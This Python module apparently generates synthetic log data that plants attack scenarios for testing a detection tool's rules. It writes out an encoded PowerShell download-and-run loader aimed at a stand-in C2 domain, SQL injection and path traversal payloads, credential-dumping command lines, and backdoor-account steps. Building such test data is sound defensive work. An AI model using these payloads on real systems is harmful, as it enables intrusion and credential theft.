"""The attacks planted in the generated logs.

Each scenario writes its lines into the timelines as *fixed* lines (always
written, whatever the event budget) and returns a :class:`Scenario` that
records when it happened, who was involved and which built-in rules should
raise an alert for it. Together the scenarios trigger every built-in rule.
"""

from __future__ import annotations

import base64
import random
from collections.abc import Mapping
from dataclasses import dataclass
from datetime import UTC, datetime
from typing import Any

from watchpost.datagen.formats import (
    EVENTLOG_PROVIDER,
    access_line,
    syslog_line,
    sysmon_event,
    windows_event,
)
from watchpost.datagen.timeline import Timeline
from watchpost.datagen.world import (
    ADMINISTRATOR,
    BACKUP_USER,
    C2_ADDRESS,
    C2_DOMAIN,
    DOMAIN_CONTROLLER,
    LOGON_ATTACKER,
    MALWARE_SHA256,
    NETBIOS_DOMAIN,
    PHISHING_VICTIM,
    SSH_ATTACKER,
    WEB_SCANNER,
    stable_hex,
)

AUTH_LOG = "auth.log"
ACCESS_LOG = "access.log"
WINDOWS_LOG = "windows_security.jsonl"
SYSMON_LOG = "sysmon.jsonl"

INTEL_RULE = "threat-intel-indicator-match"


@dataclass(frozen=True, slots=True)
class Scenario:
    """One planted attack and what Watchpost should make of it."""

    id: str
    category: str
    title: str
    summary: str
    start: float
    end: float
    log_file: str
    attacker: str | None
    target: str
    rules: tuple[str, ...]

    def to_json(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "category": self.category,
            "title": self.title,
            "summary": self.summary,
            "start": datetime.fromtimestamp(self.start, UTC).isoformat(),
            "end": datetime.fromtimestamp(self.end, UTC).isoformat(),
            "log_file": self.log_file,
            "attacker": self.attacker,
            "target": self.target,
            "expected_rules": list(self.rules),
        }


def _encode_powershell(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


LOADER = _encode_powershell(
    f"IEX (New-Object Net.WebClient).DownloadString('https://{C2_DOMAIN}/a')"
)


# --------------------------------------------------------------------------
# Linux: SSH brute force, then privilege escalation and a backdoor account
# --------------------------------------------------------------------------

SSH_HOST = "web-01"
INVALID_NAMES = ("admin", "ubuntu", "oracle", "test", "postgres", "git")


def ssh_brute_force(rng: random.Random, start: float, out: Timeline) -> Scenario:
    at = start

    def sshd(pid: int, message: str, step: float = 0.0) -> None:
        nonlocal at
        at += step
        out.add(at, syslog_line(at, SSH_HOST, "sshd", pid, message), fixed=True)

    for name in INVALID_NAMES:
        pid, port = rng.randint(3000, 9000), rng.randint(40000, 60000)
        sshd(pid, f"Invalid user {name} from {SSH_ATTACKER} port {port}", rng.uniform(0.8, 2.5))
        sshd(
            pid,
            f"Failed password for invalid user {name} from {SSH_ATTACKER} port {port} ssh2",
            rng.uniform(1.5, 2.5),
        )
        sshd(
            pid,
            f"Connection closed by invalid user {name} {SSH_ATTACKER} port {port} [preauth]",
            0.3,
        )
    for attempt in range(12):
        if attempt % 6 == 0:
            pid, port = rng.randint(3000, 9000), rng.randint(40000, 60000)
        sshd(
            pid,
            f"Failed password for root from {SSH_ATTACKER} port {port} ssh2",
            rng.uniform(1.8, 3.5),
        )
        if attempt % 6 == 5:
            sshd(
                pid,
                "error: maximum authentication attempts exceeded for root from "
                f"{SSH_ATTACKER} port {port} ssh2 [preauth]",
                0.2,
            )
            sshd(
                pid,
                f"Disconnecting authenticating user root {SSH_ATTACKER} port {port}: "
                "Too many authentication failures [preauth]",
                0.01,
            )
    pid = rng.randint(3000, 9000)
    sshd(
        pid,
        "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= "
        f"rhost={SSH_ATTACKER}  user={BACKUP_USER.name}",
        rng.uniform(5, 10),
    )
    for _ in range(3):
        port = rng.randint(40000, 60000)
        sshd(
            pid,
            f"Failed password for {BACKUP_USER.name} from {SSH_ATTACKER} port {port} ssh2",
            rng.uniform(4, 9),
        )
    pid, port = rng.randint(3000, 9000), rng.randint(40000, 60000)
    sshd(
        pid,
        f"Accepted password for {BACKUP_USER.name} from {SSH_ATTACKER} port {port} ssh2",
        rng.uniform(5, 15),
    )
    sshd(
        pid,
        f"pam_unix(sshd:session): session opened for user {BACKUP_USER.name}"
        f"(uid={BACKUP_USER.uid}) by (uid=0)",
        0.004,
    )
    return Scenario(
        id="ssh-brute-force",
        category="Brute force",
        title="SSH brute force that ends in a login",
        summary=(
            f"{SSH_ATTACKER} guesses invalid usernames and root's password on {SSH_HOST}, "
            f"then gets in as '{BACKUP_USER.name}', an account that normally only logs in "
            f"with a key from {BACKUP_USER.address}."
        ),
        start=start,
        end=at,
        log_file=AUTH_LOG,
        attacker=SSH_ATTACKER,
        target=SSH_HOST,
        rules=(
            "ssh-brute-force",
            "ssh-password-spraying",
            "ssh-brute-force-then-success",
            "login-from-new-source-ip",
            INTEL_RULE,
        ),
    )


def linux_privilege_escalation(rng: random.Random, start: float, out: Timeline) -> Scenario:
    at = start
    user, new_account = BACKUP_USER.name, "svc-update"

    def line(program: str, pid: int | None, message: str, step: float) -> None:
        nonlocal at
        at += step
        out.add(at, syslog_line(at, SSH_HOST, program, pid, message), fixed=True)

    def sudo(command: str, step: float) -> None:
        line(
            "sudo",
            None,
            f"{user:>8} : TTY=pts/1 ; PWD=/home/{user} ; USER=root ; COMMAND={command}",
            step,
        )
        line(
            "sudo",
            None,
            f"pam_unix(sudo:session): session opened for user root(uid=0) by "
            f"{user}(uid={BACKUP_USER.uid})",
            0.002,
        )
        line("sudo", None, "pam_unix(sudo:session): session closed for user root", 0.4)

    sudo("/usr/bin/id", rng.uniform(10, 30))
    sudo("/usr/bin/cat /etc/shadow", rng.uniform(15, 40))
    sudo(f"/usr/sbin/useradd -m -s /bin/bash {new_account}", rng.uniform(20, 45))
    pid = rng.randint(3000, 9000)
    line("useradd", pid, f"new group: name={new_account}, GID=1003", 0.01)
    line(
        "useradd",
        pid,
        f"new user: name={new_account}, UID=1003, GID=1003, home=/home/{new_account}, "
        "shell=/bin/bash, from=/dev/pts/1",
        0.001,
    )
    sudo(f"/usr/sbin/usermod -aG sudo {new_account}", rng.uniform(10, 20))
    pid = rng.randint(3000, 9000)
    line("usermod", pid, f"add '{new_account}' to group 'sudo'", 0.01)
    line("usermod", pid, f"add '{new_account}' to shadow group 'sudo'", 0.001)
    sudo(f"/usr/bin/passwd {new_account}", rng.uniform(5, 15))
    line(
        "passwd",
        rng.randint(3000, 9000),
        f"pam_unix(passwd:chauthtok): password changed for {new_account}",
        rng.uniform(3, 8),
    )
    sudo(f"/usr/bin/crontab -u {new_account} /tmp/.update.cron", rng.uniform(20, 60))
    return Scenario(
        id="linux-privilege-escalation",
        category="Privilege escalation and persistence",
        title="Password hashes read and a backdoor admin account created",
        summary=(
            f"Logged in as '{user}', the attacker reads /etc/shadow with sudo, creates "
            f"'{new_account}', adds it to the sudo group and schedules a cron job for it."
        ),
        start=start,
        end=at,
        log_file=AUTH_LOG,
        attacker=SSH_ATTACKER,
        target=SSH_HOST,
        rules=("linux-shadow-file-access", "linux-user-created", "linux-user-added-to-admin-group"),
    )


# --------------------------------------------------------------------------
# Web: scanning, SQL injection and path traversal against the shop
# --------------------------------------------------------------------------

NIKTO = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:{test:06d})"
SQLMAP = "sqlmap/1.8.4#stable (https://sqlmap.org)"
SCRIPT = "python-requests/2.32.3"
PROBE_PATHS = (
    "/admin/",
    "/.env",
    "/.git/config",
    "/wp-login.php",
    "/phpmyadmin/",
    "/server-status",
    "/backup.zip",
    "/config.php.bak",
    "/.DS_Store",
    "/cgi-bin/test.cgi",
    "/actuator/health",
    "/console/",
    "/db.sql",
    "/.aws/credentials",
    "/old/",
    "/test.php",
)
# Content discovery wordlists try each name with several suffixes.
PROBE_WORDS = (
    "admin",
    "backup",
    "dev",
    "staging",
    "config",
    "db",
    "uploads",
    "private",
    "tmp",
    "logs",
    "install",
    "setup",
    "api",
    "data",
    "dump",
    "secret",
    "site",
    "web",
    "portal",
    "manager",
)
PROBE_SUFFIXES = ("/", ".php", ".bak", ".zip", ".old", ".tar.gz")
SCANNER_PROBES = 120


def scanner_probes() -> list[str]:
    """The paths the scanner requests, in order: known files first, then a wordlist."""
    paths = list(PROBE_PATHS)
    for suffix in PROBE_SUFFIXES:
        for word in PROBE_WORDS:
            path = f"/{word}{suffix}"
            if path not in paths:
                paths.append(path)
    return paths[:SCANNER_PROBES]


SQL_PAYLOADS = (
    "1%27%20OR%20%271%27=%271",
    "1%20UNION%20SELECT%20NULL,username,password%20FROM%20users--",
    "1%20UNION%20ALL%20SELECT%20NULL,NULL,@@version--",
    "1%27%20AND%20SLEEP(5)--%20-",
    "1%3BSELECT%20pg_sleep(5)--",
    "1%20AND%20extractvalue(1,concat(0x7e,version()))",
    "-1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--",
)
TRAVERSAL_PATHS = (
    "/download?file=../../../../etc/passwd",
    "/download?file=..%2f..%2f..%2f..%2fetc%2fshadow",
    "/static/%2e%2e/%2e%2e/%2e%2e/proc/self/environ",
    "/images?name=..%5c..%5c..%5cwindows%5cwin.ini",
)


def web_attack(rng: random.Random, start: float, out: Timeline) -> Scenario:
    at = start

    def request(
        path: str, status: int, size: int, agent: str, step: float, method: str = "GET"
    ) -> None:
        nonlocal at
        at += step
        out.add(
            at,
            access_line(
                at, WEB_SCANNER, None, f"{method} {path} HTTP/1.1", status, size, None, agent
            ),
            fixed=True,
        )

    for test, path in enumerate(scanner_probes(), start=1):
        request(path, 404 if test % 9 else 403, 196, NIKTO.format(test=test), rng.uniform(0.2, 0.7))
    at += rng.uniform(120, 300)
    for round_ in range(4):
        for payload in SQL_PAYLOADS:
            status = 500 if "SLEEP" in payload or round_ == 3 else 200
            request(
                f"/products?id={payload}",
                status,
                rng.randint(180, 9000),
                SQLMAP,
                rng.uniform(0.3, 6),
            )
    at += rng.uniform(60, 180)
    for path in TRAVERSAL_PATHS:
        request(path, 400, 157, SCRIPT, rng.uniform(1, 4))
    for _ in range(10):
        request("/login", 401, 88, SCRIPT, rng.uniform(1, 3), method="POST")
    return Scenario(
        id="web-attack",
        category="Web attack",
        title="Scanner, SQL injection and path traversal against the shop",
        summary=(
            f"{WEB_SCANNER} runs Nikto (120 probes, mostly 404), then sqlmap against "
            "/products?id=, then tries to read /etc/passwd and win.ini through path traversal "
            "and guesses passwords on /login."
        ),
        start=start,
        end=at,
        log_file=ACCESS_LOG,
        attacker=WEB_SCANNER,
        target="shop.example.com",
        rules=(
            "web-directory-scanning",
            "web-scanner-user-agent",
            "web-sql-injection",
            "web-path-traversal",
            INTEL_RULE,
        ),
    )


# --------------------------------------------------------------------------
# Windows: logon brute force, then persistence on the domain controller
# --------------------------------------------------------------------------


def windows_logon_brute_force(rng: random.Random, start: float, out: Timeline) -> Scenario:
    at = start
    for attempt in range(24):
        at += rng.uniform(1.5, 5)
        name = ADMINISTRATOR.name if attempt % 4 else rng.choice(("admin", "guest", "scanner"))
        out.add(
            at,
            windows_event(
                at,
                4625,
                DOMAIN_CONTROLLER,
                {
                    "SubjectUserSid": "S-1-0-0",
                    "SubjectUserName": "-",
                    "TargetUserName": name,
                    "TargetDomainName": NETBIOS_DOMAIN,
                    "LogonType": "3",
                    "WorkstationName": "-",
                    "IpAddress": LOGON_ATTACKER,
                    "IpPort": "0",
                    "AuthenticationPackageName": "NTLM",
                    "Status": "0xc000006d",
                    "SubStatus": "0xc000006a" if name == ADMINISTRATOR.name else "0xc0000064",
                    "FailureReason": "%%2313",
                },
                success=False,
            ),
            fixed=True,
        )
    at += rng.uniform(10, 40)
    logon_id = f"0x{rng.randint(0x100000, 0xFFFFFFF):x}"
    out.add(
        at,
        windows_event(
            at,
            4624,
            DOMAIN_CONTROLLER,
            {
                "SubjectUserSid": "S-1-0-0",
                "SubjectUserName": "-",
                "TargetUserSid": ADMINISTRATOR.sid,
                "TargetUserName": ADMINISTRATOR.name,
                "TargetDomainName": NETBIOS_DOMAIN,
                "TargetLogonId": logon_id,
                "LogonType": "3",
                "LogonProcessName": "NtLmSsp",
                "AuthenticationPackageName": "NTLM",
                "WorkstationName": "-",
                "IpAddress": LOGON_ATTACKER,
                "IpPort": "0",
            },
        ),
        fixed=True,
    )
    at += 0.001
    out.add(
        at,
        windows_event(
            at,
            4672,
            DOMAIN_CONTROLLER,
            {
                "SubjectUserSid": ADMINISTRATOR.sid,
                "SubjectUserName": ADMINISTRATOR.name,
                "SubjectDomainName": NETBIOS_DOMAIN,
                "SubjectLogonId": logon_id,
                "PrivilegeList": "SeSecurityPrivilege SeBackupPrivilege SeDebugPrivilege",
            },
        ),
        fixed=True,
    )
    return Scenario(
        id="windows-logon-brute-force",
        category="Brute force",
        title="Password guessing against the domain controller",
        summary=(
            f"{LOGON_ATTACKER} fails 24 network logons on DC01, mostly as '{ADMINISTRATOR.name}', "
            f"then logs on successfully from an address the account has never used."
        ),
        start=start,
        end=at,
        log_file=WINDOWS_LOG,
        attacker=LOGON_ATTACKER,
        target=DOMAIN_CONTROLLER,
        rules=("windows-logon-brute-force", "login-from-new-source-ip", INTEL_RULE),
    )


def windows_persistence(rng: random.Random, start: float, out: Timeline) -> Scenario:
    at = start
    subject = {
        "SubjectUserSid": ADMINISTRATOR.sid,
        "SubjectUserName": ADMINISTRATOR.name,
        "SubjectDomainName": NETBIOS_DOMAIN,
    }
    new_account = "helpdesk-svc"
    new_sid = "S-1-5-21-1004336348-1177238915-682003330-1612"

    def event(
        event_id: int, data: dict[str, Any], step: float, provider: str | None = None
    ) -> None:
        nonlocal at
        at += step
        line = (
            windows_event(at, event_id, DOMAIN_CONTROLLER, data, provider=provider)
            if provider
            else windows_event(at, event_id, DOMAIN_CONTROLLER, data)
        )
        out.add(at, line, fixed=True)

    event(
        4688,
        {
            **subject,
            "NewProcessId": "0x1a2c",
            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": (
                f"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {LOADER}"
            ),
            "ProcessId": "0x0f10",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
            "TokenElevationType": "%%1937",
        },
        rng.uniform(30, 90),
    )
    event(
        4720,
        {
            **subject,
            "TargetUserName": new_account,
            "TargetDomainName": NETBIOS_DOMAIN,
            "TargetSid": new_sid,
            "SamAccountName": new_account,
        },
        rng.uniform(40, 120),
    )
    event(
        4722,
        {
            **subject,
            "TargetUserName": new_account,
            "TargetDomainName": NETBIOS_DOMAIN,
            "TargetSid": new_sid,
        },
        0.2,
    )
    event(
        4732,
        {
            **subject,
            "MemberName": "-",
            "MemberSid": new_sid,
            "TargetUserName": "Administrators",
            "TargetDomainName": "Builtin",
        },
        rng.uniform(5, 15),
    )
    event(
        4698,
        {
            **subject,
            "TaskName": "\\Microsoft\\Windows\\Update\\UpdaterTask",
            "TaskContent": (
                "<Task><Triggers><LogonTrigger/></Triggers><Actions><Exec>"
                "<Command>powershell.exe</Command>"
                f"<Arguments>-w hidden -enc {LOADER}</Arguments></Exec></Actions></Task>"
            ),
        },
        rng.uniform(30, 90),
    )
    event(1102, dict(subject), rng.uniform(60, 240), provider=EVENTLOG_PROVIDER)
    return Scenario(
        id="windows-persistence",
        category="Privilege escalation and persistence",
        title="Backdoor administrator, scheduled task and a cleared audit log",
        summary=(
            f"As '{ADMINISTRATOR.name}', the attacker runs an encoded PowerShell loader on DC01, "
            f"creates '{new_account}', adds it to Administrators, registers a logon task, "
            "and clears the Security log."
        ),
        start=start,
        end=at,
        log_file=WINDOWS_LOG,
        attacker=LOGON_ATTACKER,
        target=DOMAIN_CONTROLLER,
        rules=(
            "windows-encoded-powershell",
            "windows-user-account-created",
            "windows-user-added-to-admin-group",
            "windows-scheduled-task-created",
            "windows-audit-log-cleared",
        ),
    )


# --------------------------------------------------------------------------
# Sysmon: a phishing document that leads to credential theft
# --------------------------------------------------------------------------


def phishing_to_credential_theft(rng: random.Random, start: float, out: Timeline) -> Scenario:
    victim = PHISHING_VICTIM
    computer = f"{victim.workstation}.corp.example.local"
    user = f"{NETBIOS_DOMAIN}\\{victim.name}"
    word = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
    powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    dropped = f"C:\\Users\\{victim.name}\\AppData\\Local\\Temp\\m.exe"
    document = f"C:\\Users\\{victim.name}\\Downloads\\invoice_4471.docm"
    at = start

    def event(event_id: int, data: dict[str, Any], step: float) -> None:
        nonlocal at
        at += step
        out.add(at, sysmon_event(at, event_id, computer, data), fixed=True)

    event(
        1,
        {
            "ProcessId": 3020,
            "Image": word,
            "CommandLine": f'"WINWORD.EXE" /n "{document}"',
            "User": user,
            "IntegrityLevel": "Medium",
            "Hashes": f"SHA256={stable_hex(word)}",
            "ParentProcessId": 2788,
            "ParentImage": "C:\\Windows\\explorer.exe",
        },
        0.0,
    )
    event(
        1,
        {
            "ProcessId": 4412,
            "Image": powershell,
            "CommandLine": f"powershell.exe -nop -w hidden -enc {LOADER}",
            "User": user,
            "IntegrityLevel": "Medium",
            "Hashes": f"SHA256={stable_hex(powershell)}",
            "ParentProcessId": 3020,
            "ParentImage": word,
            "ParentCommandLine": f'"WINWORD.EXE" /n "{document}"',
        },
        rng.uniform(20, 90),
    )
    event(
        22,
        {
            "ProcessId": 4412,
            "QueryName": C2_DOMAIN,
            "QueryStatus": "0",
            "QueryResults": f"::ffff:{C2_ADDRESS};",
            "Image": powershell,
            "User": user,
        },
        1.2,
    )
    event(
        3,
        {
            "ProcessId": 4412,
            "Image": powershell,
            "User": user,
            "Protocol": "tcp",
            "Initiated": "true",
            "SourceIp": victim.address,
            "SourcePort": str(rng.randint(49152, 65535)),
            "DestinationIp": C2_ADDRESS,
            "DestinationHostname": C2_DOMAIN,
            "DestinationPort": "443",
        },
        0.5,
    )
    event(
        11, {"ProcessId": 4412, "Image": powershell, "TargetFilename": dropped, "User": user}, 2.1
    )
    event(
        1,
        {
            "ProcessId": 5120,
            "Image": dropped,
            "CommandLine": f'"{dropped}" privilege::debug sekurlsa::logonpasswords',
            "User": user,
            "IntegrityLevel": "High",
            "Hashes": f"SHA256={MALWARE_SHA256.upper()}",
            "ParentProcessId": 4412,
            "ParentImage": powershell,
        },
        rng.uniform(30, 120),
    )
    event(
        10,
        {
            "SourceProcessId": 5120,
            "SourceImage": dropped,
            "TargetProcessId": 712,
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": "0x1010",
            "CallTrace": "C:\\Windows\\System32\\ntdll.dll+9d4c4",
            "SourceUser": user,
            "TargetUser": "NT AUTHORITY\\SYSTEM",
        },
        rng.uniform(5, 30),
    )
    event(
        13,
        {
            "EventType": "SetValue",
            "ProcessId": 4412,
            "Image": powershell,
            "TargetObject": (
                f"HKU\\{victim.sid}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
            ),
            "Details": dropped,
            "User": user,
        },
        rng.uniform(60, 180),
    )
    return Scenario(
        id="phishing-credential-theft",
        category="Execution, credential access and persistence",
        title="Macro document to credential dumping",
        summary=(
            f"{victim.name} opens a macro document in Word on {victim.workstation}; Word starts "
            f"encoded PowerShell that contacts {C2_DOMAIN}, drops a credential dumper that reads "
            "LSASS memory, and adds a Run key so it starts again at logon."
        ),
        start=start,
        end=at,
        log_file=SYSMON_LOG,
        attacker=C2_ADDRESS,
        target=computer,
        rules=(
            "office-app-spawns-shell",
            "windows-encoded-powershell",
            "sysmon-lsass-memory-access",
            "sysmon-registry-run-key",
            INTEL_RULE,
        ),
    )


def plant_scenarios(
    rng: random.Random, start: float, end: float, timelines: Mapping[str, Timeline]
) -> list[Scenario]:
    """Place every scenario inside ``[start, end]`` and write its lines."""
    span = end - start

    def moment(fraction: float) -> float:
        return start + span * fraction + rng.uniform(0, min(span * 0.05, 3600))

    planted = [web_attack(rng, moment(0.35), timelines[ACCESS_LOG])]
    brute_force = ssh_brute_force(rng, moment(0.55), timelines[AUTH_LOG])
    planted += [
        brute_force,
        linux_privilege_escalation(
            rng, brute_force.end + rng.uniform(60, 180), timelines[AUTH_LOG]
        ),
    ]
    logons = windows_logon_brute_force(rng, moment(0.7), timelines[WINDOWS_LOG])
    planted += [
        logons,
        windows_persistence(rng, logons.end + rng.uniform(90, 300), timelines[WINDOWS_LOG]),
        phishing_to_credential_theft(rng, moment(0.8), timelines[SYSMON_LOG]),
    ]
    return sorted(planted, key=lambda scenario: scenario.start)


INDICATORS = (
    (
        SSH_ATTACKER,
        "ip",
        "SSH brute-force source reported by several organisations",
        85,
        "ssh;brute-force",
    ),
    (WEB_SCANNER, "ip", "Web vulnerability scanner (Nikto and sqlmap)", 70, "scanner;web"),
    (
        LOGON_ATTACKER,
        "ip",
        "Password guessing against exposed Windows logons",
        80,
        "brute-force;windows",
    ),
    (
        C2_DOMAIN.replace(".", "[.]"),
        "domain",
        "PowerShell loader command-and-control domain",
        95,
        "c2;powershell",
    ),
    (C2_ADDRESS, "ip", f"Server behind {C2_DOMAIN}", 90, "c2"),
    (MALWARE_SHA256, "sha256", "Credential dumping tool", 95, "credential-access;malware"),
)


def indicator_feed() -> str:
    """The attack infrastructure as a CSV threat-intel feed."""
    rows = ["value,type,description,confidence,tags"]
    rows += [
        ",".join((value, kind, text, str(confidence), tags))
        for value, kind, text, confidence, tags in INDICATORS
    ]
    return "\n".join(rows) + "\n"
